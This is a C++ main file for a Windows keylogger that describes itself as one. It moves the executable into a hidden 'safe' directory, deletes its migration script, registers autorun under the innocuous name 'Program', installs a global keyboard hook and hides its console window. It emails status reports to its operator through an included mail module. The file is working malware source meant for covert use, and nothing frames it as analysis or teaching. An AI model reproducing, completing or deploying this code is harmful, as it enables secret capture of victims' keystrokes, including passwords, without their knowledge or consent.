#include <windows.h>
#include <fstream>
#include <chrono>
#include "include/mingw.thread.h"
#include "src/KeyboardHook.h"
#include "src/IO.h"
#include "src/AutoStart.h"
#include "src/Settings.h"
#include "src/SafeMigrate.h"
#include "src/MailSender.h"


int main()
{

    bool ok = Settings::InitSettings();
    if (!ok)
        return 0;

    if (Settings::get_autoSafeMigrate() && !ExeMigration::CheckIfSafe())
    {
            if (!ExeMigration::MigrateToSafeDir())
            {
                Mail::SendMail("Did not install keylogger", "The keylogger was unable to migrate to a safe directory and exited.\n", "", true);
                return 1;
            }
    }
    
    else
    {
        ExeMigration::DeleteMigrationScript();

        if (Settings::get_autoStartProgram())
        {
            if (!AutoStart::setAutoRun("Program", IO::GetThisFilePath()))
            {
                Mail::SendMail("Problems installing keylogger", "The keylogger failed to enable autorun.\nCan't enable autorun. \nUsed filepath: " + 
                IO::GetThisFilePath() + "The program will continue running until the PC is shut down.", "", true);
            }
        }

        ok = KeyboardHook::InstallHook();
        if (!ok)
        {
            Mail::SendMail("Failed to install keylogger", "The keylogger failed to install a keyboardhook and exited.\n", "", true);
            return 2;
        }
        else
        {
            //this hides the console window
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0))
            {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }

        KeyboardHook::UninstallHook();
    }
    return 0;
}

